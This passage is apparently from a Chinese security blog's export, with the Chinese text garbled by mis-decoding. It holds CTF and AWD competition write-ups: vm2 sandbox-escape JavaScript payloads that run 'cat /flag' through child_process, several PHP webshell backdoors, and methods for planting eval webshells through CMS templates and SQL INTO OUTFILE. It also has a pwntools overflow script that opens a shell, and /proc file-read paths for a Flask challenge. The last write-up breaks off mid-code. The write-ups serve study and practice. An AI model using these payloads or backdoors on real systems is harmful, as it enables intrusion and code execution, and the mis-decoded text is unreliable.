<p>å½“å…¶ä¸${}æ­é…ä¹‹åæ›´æ˜¯å¯ä»¥å¤§å¤§é™ä½æˆ‘ä»¬ä¹¦å†™å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–é—®é¢˜ï¼š</p>
<p><img src="image-20201217151200088.png" alt="image-20201217151200088"></p>
<p>é‚£ä¹ˆç°åœ¨å›åˆ°é¢˜ç›®æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‹¼æ¥å˜é‡è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å…ˆç”¨åå¼•å·å°†éœ€è¦çš„ä¸œè¥¿åŒ…å«èµ·æ¥ï¼Œå†ç”¨${}å³å¯è¡¨ç¤ºä¸ºä¸€ä¸ªå˜é‡ï¼š</p>
<p><img src="image-20201217151634833.png" alt="image-20201217151634833"></p>
<h3 id="çš„è¯­æ³•-1"><a href="#çš„è¯­æ³•-1" class="headerlink" title="[]çš„è¯­æ³•"></a>[]çš„è¯­æ³•</h3><p>å¦‚æœä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨ç‚¹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]æ¥ç»•è¿‡ï¼š<a href="https://blog.csdn.net/qq_39125684/article/details/80327218">JSä¸­çš„ä¸­æ‹¬å·</a></p>
<p>è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ä»»æ„çš„ç»•è¿‡å…³é”®å‚æ•°åŒ¹é…ï¼Œæ‹¼æ¥å‡ºä¸Šå›¾çš„Payloadäº†</p>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h2><p>åˆ©ç”¨joinæ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function">()=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JSå½“ä¸­ä½¿ç”¨join()ä¸­æ·»åŠ å‚æ•°æ¥å†³å®šå¦‚ä½•æ‹¼æ¥ï¼Œå¦‚æœä¸æ·»åŠ é»˜è®¤ç”¨,åˆ†å‰²å¼€æ¥ï¼Œå¦‚æœä¸º0å°±ä¼šæ‹¼æ¥åœ¨ä¸€èµ·äº†</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC 3"></a>POC 3</h2><h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="VM2æ²™ç®±é€ƒé€¸åŸç†"><a href="#VM2æ²™ç®±é€ƒé€¸åŸç†" class="headerlink" title="VM2æ²™ç®±é€ƒé€¸åŸç†"></a>VM2æ²™ç®±é€ƒé€¸åŸç†</h1><p><a href="https://www.anquanke.com/post/id/207291">å…ˆä¸¢åœ¨è¿™ï¼Œä¸æ•¢ç¢°æˆ‘npmç¯å¢ƒç°åœ¨</a></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Javascirpt</tag>
        <tag>vm2æ²™ç®±é€ƒé€¸</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€æ¬¡AWDè®°å½•</title>
    <url>/2020/12/14/%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>å¹´ç»ˆäº†é˜Ÿå†…æ‰“ç®—å¼„ä¸€æ¬¡è€ƒæ ¸..ç»„ç»‡äº†ä¸€åœºAWDçš„æ¯”èµ›ï¼Œåˆ†åˆ«æœ‰PWNç¯å¢ƒå’ŒWEBç¯å¢ƒï¼Œæ‰“å®Œä¹‹åæ‰“ç®—æ€»ç»“ä¸€ä¸‹</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>webè¿™æ–¹é¢Dç›¾æ‰«å‡ºæ¥çš„æ´åªèƒ½æ‰«å‡ºæ¥ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°å’Œä¸€ä¸ªç«å±±å¤§é©¬ï¼š</p>
<h2 id="å›è°ƒå‡½æ•°"><a href="#å›è°ƒå‡½æ•°" class="headerlink" title="å›è°ƒå‡½æ•°"></a>å›è°ƒå‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @forward_static_call_array($_GET[<span class="string">&#x27;a&#x27;</span>],<span class="keyword">array</span>($_GET[<span class="string">&#x27;b&#x27;</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œa=system&amp;b=cat /flagå³å¯</p>
<h2 id="å¤§ğŸ"><a href="#å¤§ğŸ" class="headerlink" title="å¤§ğŸ"></a>å¤§ğŸ</h2><p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214163830402.png" alt="image-20201214163830402"></p>
<p>ä¸è¿‡å› ä¸ºè‡ªå·±å¹¶ä¸è®°å¾—è¿™ä¸ªåé—¨çš„å¯†ç ï¼Œä½†æ˜¯è¯•ä¸€ä¸‹æ„Ÿè§‰è¿™ä¸ª$så°±æ˜¯å¯†ç ï¼Œå°è¯•ä¸€å“ˆï¼Œå˜»å˜»å°±è¿›å»äº†</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214202614801.png" alt="image-20201214202614801"></p>
<h2 id="1-å˜é‡è¦†ç›–å‘½ä»¤æ‰§è¡Œ"><a href="#1-å˜é‡è¦†ç›–å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1 å˜é‡è¦†ç›–å‘½ä»¤æ‰§è¡Œ"></a>1 å˜é‡è¦†ç›–å‘½ä»¤æ‰§è¡Œ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $age;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;name=base64_decode($name);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $$key=$value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$stu=<span class="keyword">new</span> people(<span class="string">&#x27;YXNzZXJ0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$stu1=$stu-&gt;name;</span><br><span class="line"></span><br><span class="line">$stu1($key);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªå˜é‡è¦†ç›–çš„é©¬ï¼Œå°†YXNzZXJ0åˆ©ç”¨base64è§£ç ä¹‹åå°±æ˜¯assertï¼Œæ‰€ä»¥æ¯æ¬¡å½“è¿™ä¸ªé¡µé¢è¢«åˆ›å»ºä¹‹åï¼Œpeopleç±»å°±ä¼šè¢«å®ä¾‹åŒ–ï¼Œèµ°åˆ°æœ€åä¸€æ­¥å°±ç›¸å½“äºä½¿ç”¨äº†assert($key);ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨å˜é‡è¦†ç›–keyå³å¯</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214175437744.png" alt="image-20201214175437744"></p>
<h2 id="2-array-intersect-ukey-å‘½ä»¤æ‰§è¡Œ"><a href="#2-array-intersect-ukey-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="2 array_intersect_ukey å‘½ä»¤æ‰§è¡Œ"></a>2 array_intersect_ukey å‘½ä»¤æ‰§è¡Œ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@array_intersect_ukey(<span class="keyword">array</span>($_GET[<span class="string">&#x27;b&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="keyword">array</span>($_GET[<span class="string">&#x27;b&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),$_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">var_dump($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">$a = @array_intersect_ukey(<span class="keyword">array</span>($_GET[<span class="string">&#x27;b&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="keyword">array</span>($_GET[<span class="string">&#x27;b&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),$_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåˆšå¼€å§‹å°±çœ‹ä¸å¤ªæ‡‚ï¼Œå†æ–­ç½‘ç¯å¢ƒä¸‹å¥½é™©è‡ªå·±å­˜äº†ä¸€ä»½PHPçš„å‡½æ•°æ‰‹å†Œï¼š</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214180159394.png" alt="image-20201214180159394"></p>
<p>çœ‹äº†ä¸€ä¸‹å®˜æ–¹æ‰‹å†Œçš„ï¼Œè¯¥å‡½æ•°ä¼šæ¯”è¾ƒä¸¤ä¸ªæ•°ç»„ä¹‹é—´çš„äº¤é›†ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯ä»€ä¹ˆé‡ç‚¹ï¼Œé‡ç‚¹åœ¨äºæœ€åçš„å›è°ƒå‡½æ•°ï¼Œåœ¨è¿™é‡Œå›è°ƒçš„å‡½æ•°æ˜¯å¯ä»¥è®©æˆ‘ä»¬è‡ªç”±æ§åˆ¶çš„ï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶æˆ‘ä»¬å°†aèµ‹å€¼ä¸ºsystemå‡½æ•°ï¼Œbåˆ™æ˜¯ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214180720927.png" alt="image-20201214180720927"></p>
<p>ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä¸¤ä¸ªğŸçš„é˜²å¾¡æ–¹å¼è¿‡äºç®€å•ï¼Œæ¯”èµ›çš„æ—¶å€™å¤§å®¶éƒ½å¾ˆå¿«æ‰¾åˆ°äº†ï¼Œæ³¨é‡Šæ‰ä¹‹åæœåŠ¡å™¨ä¹Ÿä¸ä¼šå®•æœºï¼Œæ²¡åŠæ³•åªèƒ½å¦å¯»ä»–è·¯</p>
<h2 id="3-åå°ç™»é™†æ‹¿shell"><a href="#3-åå°ç™»é™†æ‹¿shell" class="headerlink" title="3 åå°ç™»é™†æ‹¿shell"></a>3 åå°ç™»é™†æ‹¿shell</h2><p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214181021794.png" alt="image-20201214181021794"></p>
<p>å› ä¸ºæ˜¯å¸å›½CMSï¼Œæ‰€ä»¥èƒ½ç™»é™†åå°çš„è¯è‚¯å®šå¯ä»¥è‡ªå®šä¹‰æ¨¡æ¿ï¼Œåˆ©ç”¨è¿™ç‚¹æˆ‘ä»¬å°±å¯ä»¥æ‹¿shelläº†~å¯†ç ä¸çŸ¥é“æœæ–­ç”¨å­—å…¸çˆ†ç ´ä¸€ä¸‹</p>
<p>ç»“æœï¼š</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214181541074.png" alt="image-20201214181541074"></p>
<p>è¿™å°±å¾ˆéš¾å—äº†ï¼Œç”¨æ‰‹æŒ¨ä¸ªå°è¯•ï¼ŒæŒ¨ä¸ªé¶æœºå°è¯•äº†æ¥è¿‘ä¸‰ååˆ†é’Ÿåç»ˆäºå¾—åˆ°å¯†ç admin123ï¼Œå¥½é™©æ”¶è—è¿‡å¸å›½CMSçš„CVEæ–‡æ¡£ï¼Œ</p>
<h3 id="æ–¹æ¡ˆä¸€"><a href="#æ–¹æ¡ˆä¸€" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h3><p>ç›´æ¥åœ¨ç®¡ç†æ•°æ®è¡¨è¿™é‡Œgetshelläº†,åˆ›å»ºä¸€ä¸ª1.php.mod,å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">&quot;Gura.php&quot;</span>,<span class="string">&quot;&lt;?php @eval(\$_POST[cmd]); ?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ç›´æ¥å°±å¯ä»¥åœ¨/adminç›®å½•ä¸‹å¾—åˆ°ä¸€ä¸ªğŸäº†</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214183450941.png" alt="image-20201214183450941"></p>
<p>å½“ç„¶æ¯”èµ›çš„æ—¶å€™å®³æ€•è¢«äººéª‘ğŸçš„è¯ï¼Œå¯ä»¥å†™å…¥åŠ å¯†é©¬ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ==<span class="string">&quot;10.160.98.116&quot;</span>)&#123;<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;æœ¬é¡µé¢æš‚æœªå®ç°åŠŸèƒ½ï¼&quot;</span>;&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ¡ˆäºŒ"><a href="#æ–¹æ¡ˆäºŒ" class="headerlink" title="æ–¹æ¡ˆäºŒ"></a>æ–¹æ¡ˆäºŒ</h3><p>æˆ‘ä»¬åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹å†™å…¥admin_tmp.php,è¿™æ ·åœ¨æ¯”èµ›ä¸­å³ä½¿è®¿é—®åˆ°æµé‡ä¹Ÿä¸ä¼šè¿‡äºå¯ç–‘</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214200337389.png" alt="image-20201214200337389"></p>
<h3 id="æ–¹æ¡ˆä¸‰"><a href="#æ–¹æ¡ˆä¸‰" class="headerlink" title="æ–¹æ¡ˆä¸‰"></a>æ–¹æ¡ˆä¸‰</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡SQLè¯­å¥çš„æ–¹å¼å»å†™å…¥shellï¼Œé¦–å…ˆåœ¨å¤‡ä»½æ•°æ®è¿™é‡Œ</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214212143756.png" alt="image-20201214212143756"></p>
<p>ä¸ºäº†æ–¹ä¾¿è¯†åˆ«è¿™é‡Œåªé€‰ä¸€ä¸ªè¡¨å°±å¯ä»¥äº†</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214215407311.png" alt="image-20201214215407311"></p>
<h3 id="æ–¹æ¡ˆä¸‰-1"><a href="#æ–¹æ¡ˆä¸‰-1" class="headerlink" title="æ–¹æ¡ˆä¸‰"></a>æ–¹æ¡ˆä¸‰</h3><p>åœ¨åå°çš„æ‰§è¡ŒSQLè¯­å¥è¿™é‡Œæ‰§è¡Œï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/e/admin/1.php&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201214220424018.png" alt="image-20201214220424018"></p>
<p>æˆåŠŸä¹‹åä¾¿ä¼šåœ¨adminç›®å½•ä¸‹ç•™ä¸‹ä¸€ä¸ª1.phpçš„åé—¨</p>
<h3 id="æ–¹æ¡ˆå››"><a href="#æ–¹æ¡ˆå››" class="headerlink" title="æ–¹æ¡ˆå››"></a>æ–¹æ¡ˆå››</h3><p>è¿™ä¸ªæ¯”èµ›ç¯å¢ƒæ²¡æœ‰åŠæ³•å®ç°ï¼Œä½†æ˜¯åœ¨èµ›åå°è¯•å¤ç°äº†ä¸€æ³¢ï¼Œå½“æˆ‘ä»¬å¼€å§‹å¤‡ä»½è¿™ä¸ªæ¨¡å—çš„æ—¶å€™éšä¾¿é€‰ä¸€ä¸ªæ•°æ®åº“ï¼š</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215135017542.png" alt="image-20201215135017542"></p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215135025900.png" alt="image-20201215135025900"></p>
<p>æˆåŠŸå†™å…¥</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215134955214.png" alt="image-20201215134955214"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>æ¯”èµ›çš„æ—¶å€™è¿˜æœ‰ä¸€å°PWNé¶æœºï¼Œè™½ç„¶è‡ªå·±PWNä¸æ˜¯å¾ˆæ‡‚å¥½é™©è¿™é“é¢˜åªæ˜¯å¾ˆç®€å•çš„åœ°å€è¦†ç›–ï¼Œè¿›å…¥mainå‡½æ•°F5ä¸€ä¸‹</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215214447767.png" alt="image-20201215214447767"></p>
<p>æˆ‘ä»¬å‘ç°å¯ä»¥æ§åˆ¶38ä¸ªå­—èŠ‚ï¼Œè€Œé¢˜ç›®è¿™é‡Œçš„é•¿åº¦åªæœ‰åä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬è·Ÿè¿›readå‡½æ•°</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215214536556.png" alt="image-20201215214536556"></p>
<p>å‘ç°ç»è¿‡ä»-10åˆ°+08ï¼Œ18ä¸ªå­—èŠ‚ä¹‹åå°±è¿›å…¥äº†rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å‡½æ•°åœ°å€ï¼Œäºæ˜¯åœ¨è¿™é‡Œç¼–å†™backdoorçš„åœ°å€</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215215247383.png" alt="image-20201215215247383"></p>
<p>è¿›å…¥åˆ°backdoorå‡½æ•°ä¹‹åï¼Œå‘ç°è¿˜éœ€è¦è¿›è¡Œå­—ç¬¦ä¸²çš„å¯¹æ¯”ï¼Œæ‰€ä»¥å†å‘é€æ•°æ®åœ¨backdooråé—¨</p>
<p><img src="%E4%B8%80%E6%AC%A1AWD%E8%AE%B0%E5%BD%95/image-20201215215327578.png" alt="image-20201215215327578"></p>
<p>ç¼–å†™è„šæœ¬ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p=remote(<span class="string">&quot;172.17.135.47&quot;</span>,<span class="number">8880</span>) </span><br><span class="line">payload=<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x400767</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;No one won&#x27;t order the splicer&quot;</span>) </span><br><span class="line">payload2=<span class="string">&quot;echo backdoor;/bin/sh&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;backdoor&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸgetshell</p>
<p><img src="file:///C:\Users\75620\AppData\Roaming\Tencent\Users\3514520240\QQ\WinTemp\RichOle~1%1M@4FBPA]5XNOW3$1J43.png" alt="img"></p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PicDown</title>
    <url>/2020/12/16/PicDown/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ol>
<li>æ–‡ä»¶åŒ…å«</li>
<li>linuxä¿¡æ¯æ–‡ä»¶è¯»å–</li>
</ol>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>å¼€å±€å°±å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åœ°æ–¹ï¼Œåˆ©ç”¨burpå°±å¯ä»¥æŠ“å–æ•°æ®</p>
<p><img src="image-20201216154655759.png" alt="image-20201216154655759"></p>
<p>ä¹‹åä½ å¯ä»¥ç›´æ¥è¯»å–åˆ°flagäº†[</p>
<p>æˆ‘æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªï¼Œè¿™é“é¢˜åº”è¯¥æ²¡é‚£ä¹ˆç®€å•ï¼Œçœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“åº”è¯¥è¯»å–linuxprocä¸‹çš„æ–‡ä»¶ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/[pid]/cmdline  #æŸ¥çœ‹å½“å‰linuxæ­£åœ¨æ‰§è¡Œä»€ä¹ˆå‘½ä»¤ï¼Œåœ¨è¿™é‡Œpidä¸çŸ¥é“çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡selfä»£æŒ‡å½“å‰webç«¯çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">/proc/self/comm #æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å‘½ä»¤å</span><br><span class="line"></span><br><span class="line">/proc/self/cwd #æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·è¿æ¥</span><br><span class="line"></span><br><span class="line">/proc/self/environ #æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span><br><span class="line"></span><br><span class="line">/proc/self/exe #æŸ¥çœ‹å®é™…è¿è¡Œç¨‹åºçš„ç¬¦å·é“¾æ¥</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/proc/self/fd #ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼ˆæ³¨æ„è¿™é‡Œæ›¾ç»å‡ºè¿‡è€ƒç‚¹ï¼Œå¦‚æœçœ‹åˆ°ä¸€ä¸ªç¨‹åºPythonæ‰“å¼€æŸä¸ªtxtä¹‹åæ²¡æœ‰å…³é—­ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™é‡Œæ¥è¯»å– </span><br></pre></td></tr></table></figure>



<p>æ—¢ç„¶æ˜¯flaskæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–app.pyï¼Œè·å–æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/page&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span 